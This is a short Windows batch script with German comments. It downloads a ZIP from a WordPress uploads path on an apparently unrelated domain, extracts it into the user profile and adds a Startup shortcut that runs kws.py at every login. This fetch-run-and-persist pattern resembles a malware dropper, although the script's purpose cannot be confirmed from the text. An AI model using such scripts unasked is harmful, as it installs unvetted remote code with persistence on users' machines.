@echo off
REM Erstelle im Benutzerprofil einen Ordner namens "kws"
set "KWS_DIR=%USERPROFILE%\kws"
if not exist "%KWS_DIR%" (
    mkdir "%KWS_DIR%"
    echo Ordner %KWS_DIR% wurde erstellt.
) else (
    echo Ordner %KWS_DIR% existiert bereits.
)

REM URL zum ZIP-Paket (bitte anpassen!)
set "ZIP_URL=http://a38.corecosmetic.de/wp-content/uploads/2025/03/kws-py.zip"
set "ZIP_FILE=%KWS_DIR%\kws_package.zip"

REM Lade das ZIP-Paket mithilfe von PowerShell herunter
powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_FILE%'"
echo ZIP-Paket wurde heruntergeladen.

REM Entpacke das ZIP-Paket mithilfe von PowerShell
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%KWS_DIR%' -Force"
echo ZIP-Paket wurde entpackt.

REM Entferne das ZIP-Paket
del "%ZIP_FILE%"

REM Erstelle einen Shortcut im Autostart-Ordner
set "AUTOSTART_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT_NAME=kws-server.lnk"

REM Shortcut erstellen, der den kws.py per Python ausführt
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%AUTOSTART_DIR%\%SHORTCUT_NAME%'); $Shortcut.TargetPath = 'python'; $Shortcut.Arguments = '%KWS_DIR%\kws.py'; $Shortcut.WorkingDirectory = '%KWS_DIR%'; $Shortcut.Save()"
echo Autostart-Eintrag wurde erstellt.

echo Installation abgeschlossen. Der kws-server startet beim nächsten Login automatisch.
pause
